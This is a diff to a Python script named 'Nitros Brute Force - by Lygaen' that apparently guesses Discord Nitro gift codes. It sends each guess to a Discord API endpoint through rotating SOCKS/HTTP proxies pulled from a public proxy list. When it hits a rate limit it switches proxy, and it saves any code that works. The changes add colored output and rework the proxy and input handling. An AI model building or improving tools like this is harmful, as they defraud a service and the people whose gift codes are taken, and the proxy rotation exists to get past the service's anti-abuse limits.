@@ -14,21 +14,35 @@ import json
 import ctypes
 import os
 
+# Colors
+
+
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+
 # Setting up
 kernel32 = ctypes.windll.kernel32
 kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
 nums = {'total': 0, 'hits': 0}
-title = 'Nitros Brute Force - by Lygaen - Total : ' + \
+title = 'Nitros Brute Force - by Lygaen - Tried : ' + \
     str(nums['total']) + ' | Nitros : ' + str(nums['hits'])
 ctypes.windll.kernel32.SetConsoleTitleW(title)
 
 
 def generate_proxies():
-    print('Generating HTTP...')
-    url = 'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all'
+    print(bcolors.OKBLUE + 'Generating Socks5...')
+    url = 'https://api.proxyscrape.com/?request=getproxies&proxytype=socks5&timeout=10000&country=all'
     r = requests.get(url, allow_redirects=True)
     open('proxies.txt', 'wb').write(r.content)
-    print('Generated ', len(r.content), ' HTTP Proxies')
+    print(bcolors.OKBLUE + 'Generated Socks5 Proxies')
     os.system('pause')
     quit()
 
@@ -36,14 +50,14 @@ def generate_proxies():
 # Check for proxies.txt file
 if not os.path.isfile('proxies.txt'):
 
-    print("No proxies file found, ")
+    print(bcolors.OKBLUE + "No proxies file found, ")
     print(
-        "Would you like to generate the file and some proxies ? [1] Yes, both [2] No, just the file")
+        bcolors.OKBLUE + "Would you like to generate the file and some proxies ? [1] Yes, both [2] No, just the file")
     try:
         reponse = int(input())
     except ValueError:
-        print('Not a valid number !')
-        print('Please give a valid reponse : 1 or 2')
+        print(bcolors.FAIL + 'Not a valid number !')
+        print(bcolors.OKBLUE + 'Please give a valid reponse : 1 or 2')
         os.system('pause')
         quit()
     if reponse == 1:
@@ -53,11 +67,11 @@ if not os.path.isfile('proxies.txt'):
     elif reponse == 2:
         new = open('proxies.txt', 'w')
         new.close()
-        print('Created the file.')
+        print(bcolors.OKGREEN + 'Created the file.')
         os.system('pause')
         quit()
     else:
-        print('Please give a valid reponse : 1 or 2')
+        print(bcolors.FAIL + 'Please give a valid reponse : 1 or 2')
         os.system('pause')
         quit()
 
@@ -77,40 +91,38 @@ data = proxiesRaw.read()
 # Check if empty
 if len(data) == 0:
     print(
-        'No proxies found in the proxies.txt file, Would you like to generate some ? [1] Yes [2] No')
+        bcolors.OKBLUE + 'No proxies found in the proxies.txt file, Would you like to generate some ? [1] Yes [2] No')
     try:
         reponse = int(input())
     except ValueError:
-        print('Not a valid number !')
-        print('Please give a valid reponse : 1 or 2')
+        print(bcolors.FAIL + 'Not a valid number !')
+        print(bcolors.OKBLUE + 'Please give a valid reponse : 1 or 2')
         os.system('pause')
         quit()
     if reponse == 1:
         generate_proxies()
     elif reponse == 2:
-        new = open('proxies.txt', 'w')
-        new.close()
-        print('Created the file.')
+        print(bcolors.WARNING + 'Okay, aborting')
         os.system('pause')
         quit()
     else:
-        print('Please give a valid reponse : 1 or 2')
+        print(bcolors.FAIL + 'Please give a valid reponse : 1 or 2')
         os.system('pause')
         quit()
-    os.system('pause')
-    quit()
 
 
 # Split each proxy
 proxies = data.split('\n')
-print('Found ', len(proxies), ' potential proxies !')
+print(bcolors.OKGREEN + 'Found ', len(proxies), ' proxies')
 
 # Get Proxy type
+print(bcolors.OKBLUE + 'What is the type of the Proxy ?')
 proxyChoice = input(
-    '[1] HTTP Proxies\n[2] SOCKS4 Proxies\n[3] SOCKS5 Proxies\n')
-while proxyChoice != '1':
-    if proxyChoice != '2':
-        proxyChoice = proxyChoice != '3' and input('Choose either 1, 2 or 3\n')
+    bcolors.OKBLUE + '[1] HTTP Proxies\n[2] SOCKS4 Proxies\n[3] SOCKS5 Proxies\n')
+if proxyChoice != '1' and proxyChoice != '2' and proxyChoice != '3':
+    print(bcolors.FAIL + 'Enter a valid number.')
+    os.system('pause')
+    quit()
 
 if proxyChoice == '1':
     proxyType = 'http://'
@@ -118,18 +130,21 @@ elif proxyChoice == '2':
     proxyType = 'socks4://'
 elif proxyChoice == '3':
     proxyType = 'socks5://'
+input_ = input(bcolors.OKBLUE + 'Threads : ')
 try:
-    threads = int(input('Threads : '))
+    threads = int(input_)
 except ValueError:
-    print('Enter a valid number.')
+    print(bcolors.FAIL + 'Enter a valid number.')
     os.system('pause')
+    quit()
 
 # Get timeout
 try:
-    timeout = int(input('Timeout (in sec) : '))
+    timeout = int(input(bcolors.OKBLUE + 'Timeout (in sec) : '))
 except ValueError:
-    print('Enter a valid number.')
+    print(bcolors.FAIL + 'Enter a valid number.')
     os.system('pause')
+    quit()
 
 proxyForThread = {}
 retriesForThread = {}
@@ -157,39 +172,44 @@ def checkKey(key, threadName):  # Get the API 'cause it's easier ;)
                                               'https': proxyType + proxies[int(proxyForThread[threadName])]},
                                 timeout=timeout).json()
         except (requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout):
-            print('[-] Connection timed out, changing proxy.')
+            print(bcolors.FAIL +
+                  '[-] Connection timed out, changing proxy.')
             changeProxy(threadName)
             continue
         except requests.exceptions.ProxyError:
-            print('[-] Connection refused, changing proxy.')
+            print(bcolors.FAIL + '[-] Connection refused, changing proxy.')
             changeProxy(threadName)
             continue
         except requests.exceptions.ConnectionError:
-            print('[-]Connection error: retrying.')
+            print(bcolors.FAIL + '[-] Connection error : retrying.')
             retriesForThread[threadName] = retriesForThread[threadName] + 1
             if retriesForThread[threadName] > 4:
-                print('[-] Connection error : retries exceeded 4, changing proxy.')
+                print(
+                    bcolors.WARNING + '[-] Connection error : retries exceeded 4, changing proxy.')
                 changeProxy(threadName)
                 retriesForThread[threadName] = 0
             continue
         except json.decoder.JSONDecodeError:
-            print('[-] JSON decode error: retrying.')
+            print(bcolors.FAIL + '[-] JSON decode error: retrying.')
             continue
         except (KeyError, IndexError):
-            print('[-] Thread reached final proxy, looping.')
+            print(bcolors.WARNING + '[-] Thread reached final proxy, looping.')
             proxyForThread[threadName] = 0
             continue
-        else:
-            print('[-] SSL error : retrying.')
+        except Exception as e:
+            print(e)
+            print(bcolors.FAIL + '[-] SSL error : retrying.')
             retriesForThread[threadName] = retriesForThread[threadName] + 1
             if retriesForThread[threadName] > 4:
-                print('[-] SSL error: retries exceeded 4, changing proxy.')
+                print(bcolors.WARNING +
+                      '[-] SSL error: retries exceeded 4, changing proxy.')
                 changeProxy(threadName)
                 retriesForThread[threadName] = 0
             continue
+
         retriesForThread[threadName] = 0
         break
-
+    print(bcolors.HEADER + '[+] Cheking for key : ' + key)
     try:
         response = body['message']
     except (KeyError, IndexError):
@@ -198,20 +218,25 @@ def checkKey(key, threadName):  # Get the API 'cause it's easier ;)
     if response != 'Unknown Gift Code':
         if response != 'You are being rate limited.':
             saveKey(key, body)
-            print(
-                '[+] Hit : working nitro saved ! Here is the sweet nitro code : ', key)
+            print('')
+            print('')
+            print(bcolors.OKGREEN +
+                  '[+] Hit : working nitro saved ! Here is the sweet nitro code : ', key)
+            print('')
+            print('')
             nums['hits'] = nums['hits'] + 1
-            title = 'Discord Bruteforcer - by jonjo - Total: ' + \
-                str(nums['total']) + ' | Hits: ' + str(nums['hits'])
+            title = 'Nitros Brute Force - by Lygaen - Tried : ' + \
+                str(nums['total']) + ' | Nitros : ' + str(nums['hits'])
             ctypes.windll.kernel32.SetConsoleTitleW(title)
-        if response == 'You are being rate limited.':
-            print('[-] Rate limit detected, changing proxy.')
+            os.system('pause')
+        elif response == 'You are being rate limited.':
+            print(bcolors.WARNING + '[-] Rate limit detected, changing proxy.')
             changeProxy(threadName)
             checkKey(key, threadName)
-        elif response == 'Unknown Gift Code':
-            print('[-] Miss : ', key)
+    else:
+        print(bcolors.BOLD + bcolors.WARNING + '[-] Miss : ', key)
     nums['total'] = nums['total'] + 1
-    title = 'Nitros Brute Force - by Lygaen - Total : ' + \
+    title = 'Nitros Brute Force - by Lygaen - Tried : ' + \
         str(nums['total']) + ' | Nitros : ' + str(nums['hits'])
     ctypes.windll.kernel32.SetConsoleTitleW(title)
 
